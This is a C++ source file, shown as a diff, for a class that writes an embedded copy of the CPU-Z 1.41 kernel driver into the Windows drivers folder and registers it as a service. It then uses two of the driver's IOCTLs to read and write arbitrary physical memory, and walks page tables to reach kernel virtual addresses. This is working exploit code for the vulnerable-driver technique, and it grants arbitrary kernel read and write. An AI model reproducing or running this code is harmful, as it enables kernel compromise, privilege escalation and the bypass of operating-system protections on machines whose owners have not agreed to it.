@@ -1,0 +1,300 @@
+#include "cpuz_driver.hpp"
+
+#include "../../scm.h"
+#include "../../sup.h"
+#include "cpuz_shellcode.h"
+
+#define CPUZ_FILE_NAME   L"\\SystemRoot\\System32\\drivers\\cpuz141.sys"
+#define CPUZ_DEVICE_NAME L"\\Device\\cpuz141"
+
+#define LODWORD(l)       ((DWORD)(((DWORD_PTR)(l)) & 0xffffffff))
+#define HIDWORD(l)       ((DWORD)((((DWORD_PTR)(l)) >> 32) & 0xffffffff))
+
+#pragma pack(push, 1)
+struct input_read_mem
+{
+  std::uint32_t address_high;
+  std::uint32_t address_low;
+  std::uint32_t length;
+  std::uint32_t buffer_high;
+  std::uint32_t buffer_low;
+};
+
+struct input_write_mem
+{
+  std::uint32_t address_high;
+  std::uint32_t address_low;
+  std::uint32_t value;
+};
+
+struct output
+{
+  std::uint32_t operation;
+  std::uint32_t buffer_low;
+};
+#pragma pack(pop)
+
+cpuz_driver::cpuz_driver()
+  : deviceHandle_(INVALID_HANDLE_VALUE), serviceHandle_(INVALID_HANDLE_VALUE), unload_(false)
+{
+}
+cpuz_driver::~cpuz_driver()
+{
+  if(unload_ && is_loaded())
+    unload();
+}
+
+cpuz_driver& cpuz_driver::instance()
+{
+  static cpuz_driver inst;
+  return inst;
+}
+
+bool cpuz_driver::ensure_loaded()
+{
+  if(!is_loaded() && !load())
+    throw std::runtime_error{ "Driver is not loaded." };
+
+  return true;
+}
+
+bool cpuz_driver::is_loaded()
+{
+  if(!deviceHandle_ || deviceHandle_ == INVALID_HANDLE_VALUE) {
+    IO_STATUS_BLOCK ioStatus;
+    NTSTATUS status;
+
+    UNICODE_STRING    usDevice      = UNICODE_STRING{sizeof(CPUZ_DEVICE_NAME) - sizeof(WCHAR), sizeof(CPUZ_DEVICE_NAME), CPUZ_DEVICE_NAME};
+    OBJECT_ATTRIBUTES objAttributes = OBJECT_ATTRIBUTES{ sizeof(OBJECT_ATTRIBUTES), NULL, &usDevice, 0, NULL, NULL };
+
+    status = NtOpenFile(
+      &deviceHandle_, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
+      &objAttributes, &ioStatus, 0, OPEN_EXISTING);
+
+    if(!NT_SUCCESS(status)) {
+      ULONG i = 4;
+      do {
+        status = NtOpenFile(
+          &deviceHandle_, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
+          &objAttributes, &ioStatus, 0, OPEN_EXISTING);
+        Sleep(250);
+      } while(!NT_SUCCESS(status) && i--);
+    }
+  }
+
+  return deviceHandle_ && deviceHandle_ != INVALID_HANDLE_VALUE;
+}
+
+bool cpuz_driver::load()
+{
+  HANDLE tempHandle;
+  ULONG ioBytes;
+
+  if(!SupFileExists(CPUZ_FILE_NAME)) {
+    tempHandle = SupCreateFile(CPUZ_FILE_NAME, FILE_GENERIC_WRITE, 0, FILE_CREATE);
+
+    if(!WriteFile(tempHandle, CpuzShellcode, sizeof(CpuzShellcode), &ioBytes, nullptr)) {
+      CloseHandle(tempHandle);
+      return false;
+    }
+    CloseHandle(tempHandle);
+  }
+
+  if(ScmOpenServiceHandle(&tempHandle, L"cpuz141", SERVICE_STOP | DELETE)) {
+    if(!ScmStopService(tempHandle) && GetLastError() != ERROR_SERVICE_NOT_ACTIVE) {
+      ScmCloseServiceHandle(tempHandle);
+      return false;
+    }
+    if(!ScmDeleteService(tempHandle)) {
+      ScmCloseServiceHandle(tempHandle);
+      return false;
+    }
+    ScmCloseServiceHandle(tempHandle);
+  }
+
+  if(!ScmCreateService(
+    &serviceHandle_,
+    L"cpuz141", L"cpuz141",
+    CPUZ_FILE_NAME,
+    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
+    SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL))
+    return false;
+
+  if(!ScmStartService(serviceHandle_)) {
+    ScmDeleteService(serviceHandle_);
+    return false;
+  }
+
+  return is_loaded();
+}
+
+bool cpuz_driver::unload()
+{
+  HANDLE tempHandle;
+
+  if(ScmOpenServiceHandle(&tempHandle, L"cpuz141", SERVICE_STOP | DELETE)) {
+    if(!ScmStopService(tempHandle) && GetLastError() != ERROR_SERVICE_NOT_ACTIVE) {
+      ScmCloseServiceHandle(tempHandle);
+      return false;
+    }
+    ScmDeleteService(tempHandle);
+    ScmCloseServiceHandle(tempHandle);
+
+    return true;
+
+  }
+  return false;
+}
+
+std::uint64_t cpuz_driver::translate_linear_address(std::uint64_t directoryTableBase, LPVOID virtualAddress)
+{
+  auto va = (std::uint64_t)virtualAddress;
+
+  auto PML4         = (USHORT)((va >> 39) & 0x1FF); //<! PML4 Entry Index
+  auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); //<! Page-Directory-Pointer Table Index
+  auto Directory    = (USHORT)((va >> 21) & 0x1FF); //<! Page Directory Table Index
+  auto Table        = (USHORT)((va >> 12) & 0x1FF); //<! Page Table Index
+  
+  // 
+  // Read the PML4 Entry. DirectoryTableBase has the base address of the table.
+  // It can be read from the CR3 register or from the kernel process object.
+  // 
+  auto PML4E = read_physical_address<std::uint64_t>(directoryTableBase + PML4 * sizeof(ULONGLONG));
+
+  if(PML4E == 0)
+    return 0;
+
+  // 
+  // The PML4E that we read is the base address of the next table on the chain,
+  // the Page-Directory-Pointer Table.
+  // 
+  auto PDPTE = read_physical_address<std::uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));
+
+  if(PDPTE == 0)
+    return 0;
+
+  //Check the PS bit
+  if((PDPTE & (1 << 7)) != 0) {
+    // If the PDPTE’s PS flag is 1, the PDPTE maps a 1-GByte page. The
+    // final physical address is computed as follows:
+    // — Bits 51:30 are from the PDPTE.
+    // — Bits 29:0 are from the original va address.
+    return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
+  }
+
+  //
+  // PS bit was 0. That means that the PDPTE references the next table
+  // on the chain, the Page Directory Table. Read it.
+  // 
+  auto PDE = read_physical_address<std::uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));
+  
+  if(PDE == 0)
+    return 0;
+
+  if((PDE & (1 << 7)) != 0) {
+    // If the PDE’s PS flag is 1, the PDE maps a 2-MByte page. The
+    // final physical address is computed as follows:
+    // — Bits 51:21 are from the PDE.
+    // — Bits 20:0 are from the original va address.
+    return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
+  }
+
+  //
+  // PS bit was 0. That means that the PDE references a Page Table.
+  // 
+  auto PTE = read_physical_address<std::uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));
+
+  if(PTE == 0)
+    return 0;
+
+  //
+  // The PTE maps a 4-KByte page. The
+  // final physical address is computed as follows:
+  // — Bits 51:12 are from the PTE.
+  // — Bits 11:0 are from the original va address.
+  return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
+}
+
+bool cpuz_driver::read_physical_address(std::uint64_t address, LPVOID buf, size_t len)
+{
+  constexpr auto ioctl = 0x9C402420;
+  auto ioBytes = 0ul;
+
+  input_read_mem in;
+  output out;
+
+  if(address == 0 || buf == nullptr)
+    return false;
+
+  in.address_high = HIDWORD(address);
+  in.address_low  = LODWORD(address);
+  in.length       = (std::uint32_t)len;
+  in.buffer_high  = HIDWORD(buf);
+  in.buffer_low   = LODWORD(buf);
+    
+  return !!DeviceIoControl(deviceHandle_, ioctl, &in, sizeof(in), &out, sizeof(out), &ioBytes, nullptr);
+}
+
+bool cpuz_driver::read_system_address(LPVOID address, LPVOID buf, size_t len)
+{
+  // TODO: Check OS build and use the correct DirBase. 
+  // The one below is for Win7 SP1
+  const auto DirBase = std::uint64_t{ 0x187000 };
+
+  auto phys = translate_linear_address(DirBase, address);
+
+  if(phys == 0)
+    return false;
+
+  return read_physical_address(phys, buf, len);
+}
+
+bool cpuz_driver::write_physical_address(std::uint64_t address, LPVOID buf, size_t len)
+{
+  if(len % 4 != 0 || len == 0)
+    throw std::runtime_error{ "The CPU-Z driver can only write lengths that are aligned to 4 bytes (4, 8, 12, 16, etc)" };
+
+  constexpr auto ioctl = 0x9C402430;
+  auto ioBytes = 0ul;
+
+  input_write_mem in;
+  output out;
+
+  if(address == 0 || buf == nullptr)
+    return false;
+
+  if(len == 4) {
+    in.address_high = HIDWORD(address);
+    in.address_low  = LODWORD(address);
+    in.value        = *(std::uint32_t*)buf;
+
+    return !!DeviceIoControl(deviceHandle_, ioctl, &in, sizeof(in), &out, sizeof(out), &ioBytes, nullptr);
+  } else {
+    for(auto i = 0; i < len / 4; i++) {
+      in.address_high = HIDWORD(address + 4 * i);
+      in.address_low  = LODWORD(address + 4 * i);
+      in.value = ((std::uint32_t*)buf)[i];
+      if(!DeviceIoControl(deviceHandle_, ioctl, &in, sizeof(in), &out, sizeof(out), &ioBytes, nullptr))
+        return false;
+    }
+    return true;
+  }
+}
+
+bool cpuz_driver::write_system_address(LPVOID address, LPVOID buf, size_t len)
+{
+  // System DirectoryTablebase.
+  // You need this so you can read system addresses.
+  // 
+  // TODO: Check OS build and use the correct DirectoryTablebase. 
+  // The one below is for Win7 SP1
+  // 
+  const auto DirBase = std::uint64_t{ 0x187000 };
+
+  auto phys = translate_linear_address(DirBase, address);
+
+  if(phys == 0)
+    return false;
+
+  return write_physical_address(phys, buf, len);
+}
